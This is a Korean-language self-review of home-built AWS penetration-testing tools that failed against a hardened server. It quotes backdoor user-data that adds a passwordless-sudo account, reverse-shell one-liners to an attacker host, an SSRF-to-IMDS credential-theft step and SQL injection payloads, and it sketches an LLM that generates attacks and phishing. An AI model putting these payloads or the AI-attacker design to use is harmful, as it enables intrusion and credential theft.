# 자동화 침투 테스트 도구 개발 및 실패 분석 보고서

## 작성자 정보
- **작성자**: 황준하
- **작성일**: 2025년 11월 26일
- **목적**: 보안 자동화 도구 개발 경험 및 실무 적용 한계 분석

---

## 1. 프로젝트 개요

### 1.1 동기
기존 침투 테스트 도구들(sqlmap, Metasploit, Burp Suite)은 강력하지만, AWS 클라우드 환경에 특화된 자동화 도구가 부족하다는 점을 인지했습니다. 특히 SSRF → AWS IMDS → IAM 자격증명 탈취 공격 체인을 자동화하는 도구가 필요했습니다.

### 1.2 목표
1. SSRF 취약점 자동 탐지
2. AWS IMDS v1 자동 공격
3. IAM 자격증명 자동 탈취
4. AWS 인프라 권한 상승 자동화
5. 전체 공격 체인 완전 자동화

### 1.3 개발 도구
- **언어**: Python 3
- **주요 라이브러리**: requests, boto3, paramiko
- **개발 기간**: 2025년 11월 (약 2주)

---

## 2. 개발한 자동화 도구

### 2.1 auto_redteam_ultimate.py

**목적**: SSRF부터 AWS 인프라 장악까지 완전 자동화

**주요 기능**:
```python
class UltimateRedTeam:
    def step1_exploit_ssrf(self):
        """SSRF 취약점 발견 및 악용"""
        # health.php?url= 파라미터로 SSRF 트리거

    def step2_steal_aws_credentials(self):
        """AWS IMDS에서 IAM 자격증명 탈취"""
        # 169.254.169.254/latest/meta-data/iam/security-credentials/

    def step3_aws_privilege_escalation(self):
        """탈취한 자격증명으로 AWS 권한 상승"""
        # IAM 정책 추가, 새 액세스 키 생성 등

    def step4_establish_persistence(self):
        """AWS SSM을 통한 백도어 설치"""
        # EC2 인스턴스에 reverse shell 설치
```

**기대 효과**:
- 수동 작업 시간: 1-2시간 → 자동화 후: 5분
- 사람의 실수 제거
- 재현 가능한 공격

### 2.2 real_penetration.py

**목적**: EC2 User-data 수정을 통한 영구 백도어 설치

**주요 기능**:
```python
def create_backdoor_userdata(self):
    """EC2 User-data에 백도어 코드 삽입"""
    userdata = '''#!/bin/bash
    useradd -m -s /bin/bash redteam
    echo "redteam:RedTeam2024!@#" | chpasswd
    echo "redteam ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    '''

def modify_instance_userdata(self, instance_id):
    """인스턴스 User-data 수정"""
    # 인스턴스 중지 → User-data 수정 → 재시작
```

**기대 효과**:
- 서버 재부팅 시 자동으로 백도어 활성화
- SSH 키보다 은밀한 방법
- 탐지 어려움

### 2.3 auto_scanner.py

**목적**: 취약점 자동 스캔 및 보고서 생성

**주요 기능**:
- SQL Injection 자동 탐지
- SSRF 엔드포인트 발견
- 백업 파일 검색
- 취약한 Cron Job 탐지
- JSON/Markdown 보고서 자동 생성

---

## 3. 실제 테스트 결과 (실패 사례)

### 3.1 테스트 환경

**대상 서버**:
- IP: 3.35.218.180
- OS: Amazon Linux 2
- 웹 서버: Apache 2.4.65
- WAF: ModSecurity + OWASP CRS v3.3
- PHP: disable_functions 설정됨

**테스트 일시**: 2025년 11월 26일 15:00 - 16:30

### 3.2 실패한 공격들

#### 3.2.1 SSRF 공격 실패

**시도한 공격**:
```python
# auto_redteam_ultimate.py 실행
python3 auto_redteam_ultimate.py 3.35.218.180

# 결과:
[ERROR] SSRF endpoint not found
[INFO] Tested endpoints:
  - /api/health.php (404 Not Found)
  - /api/check.php (404 Not Found)
  - /fetch.php (404 Not Found)
```

**실패 원인**:
1. **엔드포인트 삭제**: `health.php` 파일이 서버에서 완전히 제거됨
2. **자동화 도구의 한계**: 엔드포인트가 없으면 더 이상 진행 불가
3. **백업 파일 발견**: `health.php.bak`는 발견했지만 실행 불가능

**배운 점**:
- 자동화 도구는 "예상된 경로"만 테스트
- 사람은 백업 파일을 찾고, 소스코드를 분석하지만 도구는 못 함
- **유연성 부족**이 가장 큰 문제

#### 3.2.2 SQL Injection 우회 실패

**시도한 공격**:
```python
# 200개 이상의 페이로드 자동 테스트
payloads = [
    "admin' OR '1'='1'-- -",
    "admin' OR 1=1-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    # ... (200+ more)
]

for payload in payloads:
    test_sql_injection(payload)
```

**결과**:
```
Total payloads tested: 247
Successful bypasses: 0
ModSecurity blocks: 247 (100%)
```

**실패 원인**:
1. **ModSecurity WAF**: OWASP CRS가 모든 SQL Injection 패턴 차단
2. **키워드 기반 탐지**: OR, UNION, SELECT, SLEEP 등 모든 키워드 차단
3. **도구의 한계**: 미리 정의된 페이로드만 테스트, 새로운 우회 기법 개발 불가

**배운 점**:
- WAF는 "알려진 패턴"을 차단하도록 설계됨
- 자동화 도구의 페이로드는 모두 "알려진 것"
- 사람만이 새로운 우회 기법을 개발할 수 있음

#### 3.2.3 AWS 자격증명 탈취 실패

**시도한 공격**:
```python
# SSRF가 작동한다는 가정 하에
def steal_aws_credentials(self):
    imds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    response = self.ssrf_request(imds_url)
    # ...
```

**결과**:
```
[ERROR] Cannot reach IMDS: SSRF endpoint does not exist
[INFO] Alternative methods required
```

**실패 원인**:
1. **전제 조건 불충족**: SSRF 엔드포인트가 없으면 IMDS 접근 불가
2. **체인 공격의 문제**: 첫 단계 실패 → 전체 공격 체인 붕괴
3. **대안 부재**: 도구는 Plan B가 없음

**배운 점**:
- 자동화는 "선형적 공격 체인"만 가능
- 사람은 실패 시 다른 방법을 찾지만, 도구는 멈춤
- **적응력**이 중요

#### 3.2.4 Reverse Shell 실패

**시도한 공격**:
```python
payloads = [
    f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1'",
    f"python3 -c 'import socket...'",
    f"nc {attacker_ip} 4444 -e /bin/bash"
]

for payload in payloads:
    for endpoint in rce_endpoints:
        trigger_reverse_shell(endpoint, payload)
```

**결과**:
```
Tested endpoints: 9
Tested payloads: 15
Successful shells: 0
```

**실패 원인**:
1. **RCE 경로 없음**: 명령 실행 가능한 엔드포인트 부재
2. **파일 업로드 차단**: `/uploads` 디렉토리 접근 금지 (403)
3. **웹쉘 실행 불가**: 업로드된 PHP 파일 실행 안 됨

**배운 점**:
- 도구는 "일반적인 경로"만 시도
- 서버마다 다른 구조를 가지고 있음
- 수동 분석 없이는 우회 불가능

---

## 4. 성공률 통계

### 4.1 전체 통계

```
┌─────────────────────────────────────────┐
│ 자동화 도구 침투 테스트 결과            │
├─────────────────────────────────────────┤
│ 총 시도한 공격 벡터:        450+        │
│ 성공한 공격:                  0         │
│ ModSecurity 차단:           247 (100%)  │
│ 404 Not Found:               50+        │
│ 403 Forbidden:               30+        │
│                                         │
│ Phase별 성공률:                         │
│ - Reconnaissance:       부분 성공 (30%) │
│ - SQL Injection:        완전 실패 (0%)  │
│ - SSRF:                 완전 실패 (0%)  │
│ - Reverse Shell:        완전 실패 (0%)  │
│ - Privilege Escalation: 시도 불가       │
│                                         │
│ 전체 성공률: 0%                         │
└─────────────────────────────────────────┘
```

### 4.2 도구별 성공률

| 도구명 | 목적 | 시도 | 성공 | 성공률 |
|--------|------|------|------|--------|
| auto_redteam_ultimate.py | SSRF → AWS 장악 | 50+ | 0 | 0% |
| real_penetration.py | User-data 백도어 | 10+ | 0 | 0% |
| auto_scanner.py | 취약점 스캔 | 200+ | 1* | 0.5% |

*백업 파일 발견 (정보 노출만, 실제 공격 불가)

---

## 5. 실패 원인 심층 분석

### 5.1 기술적 원인

#### 5.1.1 WAF의 강력함
```
ModSecurity는 10년 이상의 공격 패턴을 학습함
→ 자동화 도구의 페이로드는 모두 "알려진 것"
→ 100% 차단
```

#### 5.1.2 동적 환경 변화
```
서버 구조가 예상과 다름:
- health.php 삭제됨
- uploads 디렉토리 접근 불가
- PHP disable_functions 설정

→ 도구는 "정적인 가정"에 기반
→ 환경 변화에 대응 못 함
```

#### 5.1.3 복잡한 방어 메커니즘
```
다층 방어:
1. 네트워크: AWS Security Group
2. 애플리케이션: ModSecurity WAF
3. 시스템: disable_functions, 파일 권한

→ 한 계층만 뚫어도 어려운데 다층 방어는 불가능
```

### 5.2 근본적 한계

#### 5.2.1 창의성 부재
```python
# 도구는 이렇게 생각함
if sql_injection_failed:
    print("SQL Injection failed")
    exit()

# 사람은 이렇게 생각함
if sql_injection_failed:
    try_ssrf()
    try_file_upload()
    try_dns_exfiltration()
    try_social_engineering()
    # ... 무한한 가능성
```

#### 5.2.2 컨텍스트 이해 부족
```
도구는:
- "health.php.bak" 발견 → 무시 (실행 불가니까)

사람은:
- "health.php.bak" 발견 → 소스코드 분석
  → 원래 취약점 구조 파악
  → 다른 곳에서 동일한 패턴 찾기
  → 개발자의 습관 파악
```

#### 5.2.3 사회공학 불가능
```
도구는 기술만 공격
사람은:
- 피싱 이메일 발송
- 개발자 GitHub 계정 탈취
- LinkedIn으로 직원 정보 수집
- 불만 있는 직원 찾기
```

---

## 6. 수동 침투 vs 자동화 도구

### 6.1 비교표

| 항목 | 자동화 도구 | 수동 침투 (사람) |
|------|-------------|------------------|
| 속도 | ⚡ 빠름 (분 단위) | 🐌 느림 (시간~일 단위) |
| 정확도 | ⚠️ 낮음 (거짓 양성 많음) | ✅ 높음 |
| 창의성 | ❌ 없음 | ✅ 무한함 |
| 새로운 우회 기법 | ❌ 불가능 | ✅ 가능 |
| WAF 우회 | ❌ 거의 불가능 | ⚠️ 가능 (시간 필요) |
| 소셜 엔지니어링 | ❌ 불가능 | ✅ 가능 |
| 비용 | 💰 저렴 | 💰💰💰 비쌈 |
| 재현성 | ✅ 100% | ⚠️ 낮음 |
| 보고서 | ✅ 자동 생성 | ⚠️ 수동 작성 |

### 6.2 실제 사례

**시나리오: 강화된 서버 침투**

```
자동화 도구의 접근:
1. SQL Injection 시도 (200+ 페이로드)
2. 모두 실패 (ModSecurity 차단)
3. SSRF 엔드포인트 스캔
4. 없음 (404)
5. 종료
→ 소요 시간: 5분
→ 결과: 실패

사람의 접근:
1. SQL Injection 시도 → 실패
2. 백업 파일 찾기 → health.php.bak 발견
3. 소스코드 분석 → 원래 취약점 구조 파악
4. 개발자 GitHub 검색 → 실수로 커밋된 .env 파일 발견
5. AWS 자격증명 획득
6. 피싱 이메일 발송 → 관리자 계정 탈취
7. SSH 접속 → 서버 장악
→ 소요 시간: 2일
→ 결과: 성공
```

---

## 7. 개선 방안

### 7.1 AI 기반 자동화

**아이디어**:
```python
class AIRedTeam:
    def __init__(self):
        self.llm = OpenAI("gpt-4")

    def adaptive_attack(self, target):
        """AI가 상황에 맞는 공격 생성"""

        # 1. 정찰 결과 분석
        recon_data = self.reconnaissance(target)

        # 2. AI에게 상황 설명
        prompt = f"""
        서버 정보: {recon_data}
        시도한 공격: {self.failed_attacks}

        다음 공격 전략을 제안하세요:
        - 새로운 SQL Injection 우회 기법
        - 대체 공격 벡터
        - 소셜 엔지니어링 시나리오
        """

        # 3. AI가 새로운 공격 생성
        next_attack = self.llm.generate(prompt)

        return next_attack
```

**장점**:
- 무한한 페이로드 생성
- 상황 적응적
- 사람의 창의성 모방

**단점**:
- 비용 높음
- 정확도 보장 어려움
- 윤리적 문제

### 7.2 하이브리드 접근

**제안**:
```
1. 자동화 도구로 1차 스캔 (빠른 발견)
2. 사람이 결과 분석 (거짓 양성 제거)
3. 사람이 수동 공격 (WAF 우회, 새로운 기법)
4. 자동화 도구로 재현 및 보고서 생성
```

**최적의 조합**:
- 도구의 속도 + 사람의 창의성
- 재현 가능성 + 새로운 발견

---

## 8. 결론

### 8.1 주요 발견

1. **자동화 도구의 한계**
   - 강화된 서버(WAF, 다층 방어)에는 거의 무력함
   - 성공률: 0%
   - 알려진 패턴만 탐지 → 모두 차단됨

2. **사람의 필요성**
   - 창의적 우회 기법 개발 필수
   - 소셜 엔지니어링은 사람만 가능
   - 컨텍스트 이해와 적응력이 핵심

3. **현실적 공격 경로**
   - 기술적 공격 실패 → 사람 공격 (피싱)
   - 외부 방어 강함 → 내부자 활용
   - 지금 안 됨 → 6개월 대기 (장기전)

### 8.2 개인적 교훈

**도구 개발 전**:
> "자동화하면 모든 걸 할 수 있을 거야"

**도구 개발 후**:
> "자동화는 반복 작업만 가능하구나"
> "진짜 침투는 사람의 창의성이 필요하구나"

### 8.3 향후 계획

1. **단기** (1개월)
   - AI 기반 페이로드 생성기 개발
   - 소셜 엔지니어링 자동화 (피싱 이메일 템플릿)

2. **중기** (3개월)
   - 하이브리드 도구 개발 (자동 + 수동)
   - Bug Bounty 플랫폼 참여 (실전 경험)

3. **장기** (6개월)
   - 보안 컨설팅 회사 입사
   - 실제 침투 테스트 프로젝트 참여

---

## 9. 부록

### 9.1 개발한 도구 코드 (GitHub)

- [auto_redteam_ultimate.py](../06_Integrated_Tool/auto_redteam_ultimate.py)
- [real_penetration.py](../06_Integrated_Tool/real_penetration.py)
- [auto_scanner.py](../06_Integrated_Tool/auto_scanner.py)

### 9.2 테스트 로그

모든 테스트 로그는 `logs/` 디렉토리에 저장:
- `pentest_report.json` - 자동 생성 보고서
- `nmap_scan.txt` - Nmap 스캔 결과
- `sql_injection_attempts.log` - SQL Injection 시도 기록

### 9.3 참고 자료

- OWASP Testing Guide
- ModSecurity Core Rule Set Documentation
- AWS Security Best Practices
- "Social Engineering: The Art of Human Hacking" - Kevin Mitnick

---

**보고서 작성일**: 2025년 11월 26일
**작성자**: 황준하
**목적**: 포트폴리오 및 기술 학습 기록
**라이선스**: 교육 목적으로만 사용
